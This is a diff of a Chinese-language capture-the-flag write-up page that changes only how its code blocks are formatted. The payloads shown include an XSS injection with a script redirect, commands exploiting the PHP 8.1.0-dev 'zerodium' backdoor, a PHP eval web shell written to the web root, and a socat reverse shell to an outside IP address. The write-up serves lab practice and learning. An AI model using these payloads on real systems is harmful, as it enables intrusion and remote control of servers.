@@ -122,7 +122,21 @@
 </blockquote>
 <p><img src="http://oss.hehanzzz.icu/img/202405061252398.png"></p>
 <p>提示了这个地址：nssctfroundSpring.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="comment">//部分关键代码</span>
+<span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);
+<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;
+    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;
+        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);
+        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;
+            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;
+            <span class="comment">//.......</span>
+        &#125;
+        <span class="comment">//......</span>
+    &#125;
+    <span class="comment">//......</span>
+&#125;</code></pre>
 
 <p>先继续浏览一下其他页面吧首页下</p>
 <p><img src="http://oss.hehanzzz.icu/img/202405061252748.png"></p>
@@ -150,26 +164,26 @@
 <p>前面就是正常的评论区要求的输入规则，后面的echo是xss的关键，在代码审计中echo更是xss的关键，有机会写一下关于xss的代码审计</p>
 <p>可以看到是将前面的内容直接拼接进来，所以我们按照评论规则接着使用 “&gt; 直接闭合是不是就可以达到xss</p>
 <p>理论成立，实践开始</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.com&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;img&quot;1.png 12 /png</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight HTML">http://1.com&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;img&quot;1.png 12 /png</code></pre>
 
 <p><img src="http://oss.hehanzzz.icu/img/202405061253511.png"></p>
 <p>然后就直接百度一个跳转语法就好啦</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://genshin.hoyoverse.com/&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight javascript">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://genshin.hoyoverse.com/&#x27;</span>;&lt;/script&gt;</code></pre>
 
 <p>payload：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://genshin.hoyoverse.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></span><br></pre></td></tr></table></figure>
+<pre><code class="highlight javascript"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://genshin.hoyoverse.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></code></pre>
 
 <p>因为xss跳转无法立即拿到url，所以bp拦截一下就好了</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZnZW5zaGluLmhveW92ZXJzZS5jb20lMkYnJTNCJTNDJTJGc2NyaXB0JTNFJTNDaW1nJTIyMS5wbmclMjAxMiUyMCUyRnBuZw%3D%3D</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight HTML">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZnZW5zaGluLmhveW92ZXJzZS5jb20lMkYnJTNCJTNDJTJGc2NyaXB0JTNFJTNDaW1nJTIyMS5wbmclMjAxMiUyMCUyRnBuZw%3D%3D</code></pre>
 
 <p>结果还是不行，人傻了，等重新看了一下评论区才发现，这nm我给错游戏了，应该给元梦之星</p>
 <p>重新来</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://ymzx.qq.com/&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight javascript">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://ymzx.qq.com/&#x27;</span>;&lt;/script&gt;</code></pre>
 
 <p>payload：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://ymzx.qq.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></span><br></pre></td></tr></table></figure>
+<pre><code class="highlight javascript"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://ymzx.qq.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclM0IlM0MlMkZzY3JpcHQlM0UlM0NpbWclMjIxLnBuZyUyMDEyJTIwJTJGcG5n</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclM0IlM0MlMkZzY3JpcHQlM0UlM0NpbWclMjIxLnBuZyUyMDEyJTIwJTJGcG5n</code></pre>
 
 <p>成功拿到flag：NSSCTF{64844971-41d6-4111-ab66-495df8fb4c15}</p>
 <p><img src="http://oss.hehanzzz.icu/img/202405061253073.png"></p>
@@ -195,7 +209,7 @@
 <p>那还说什么，直接开测</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev 后门远程命令执行漏洞复现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 <p>payload测试：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumvar_dump(2*3);</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight html">User-Agentt: zerodiumvar_dump(2*3);</code></pre>
 
 <p>成功回显int(6)，漏洞存在</p>
 <p><img src="http://oss.hehanzzz.icu/img/202405061253657.png"></p>
@@ -210,18 +224,18 @@
 <p>写🐎得先看目录在哪，盲猜默认目录 &#x2F;var&#x2F;www&#x2F;html</p>
 <p>ls看了一下发现确实是，回显了index.php</p>
 <p>那就直接用echo写🐎了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;echo &quot;&lt;?php @eval($_POST[1]);phpinfo();?&gt;&quot;&gt;/var/www/html/1.php&#x27;);</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">User-Agentt: zerodiumsystem(&#x27;echo &quot;&lt;?php @eval($_POST[1]);phpinfo();?&gt;&quot;&gt;/var/www/html/1.php&#x27;);</code></pre>
 
 <p>打开1.php，提示</p>
 <p><strong>Parse error</strong>:  syntax error, unexpected end of file, expecting “(“ in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php(1) : eval()’d code</strong> on line <strong>1</strong></p>
 <p><img src="http://oss.hehanzzz.icu/img/202405061253014.png"></p>
 <p>看来得对$进行转义</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;echo &quot;<span class="meta">&lt;?php @eval(\$_POST[1]);phpinfo();?&gt;</span>&quot;&gt;/var/www/html/1.php&#x27;);</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight html">User-Agentt: zerodiumsystem(&#x27;echo &quot;<span class="meta">&lt;?php @eval(\$_POST[1]);phpinfo();?&gt;</span>&quot;&gt;/var/www/html/1.php&#x27;);</code></pre>
 
 <p>成功写入，连接</p>
 <p>md还真要提权，env没有，也打不开root目录，小小ctf还整上提权了</p>
 <p>看一下内核版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">cat /etc/*-release</code></pre>
 
 <p><img src="http://oss.hehanzzz.icu/img/202405061253644.png"></p>
 <p>发现是 Ubuntu 20.04.3 LTS</p>
@@ -243,7 +257,7 @@
 <p>猜测应该是得用交互式shell才能提权了，传个socat弹个交互式shell到服务器上</p>
 <p>但是这时候，服务器崩坏了（寄，又得花费30金币）</p>
 <p>重新开了一个靶机 用socat进行交互shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:39.108.11.237:2333</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">./socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:39.108.11.237:2333</code></pre>
 
 <p><img src="http://oss.hehanzzz.icu/img/202405061253762.png"></p>
 <p>直接make 然后运行</p>
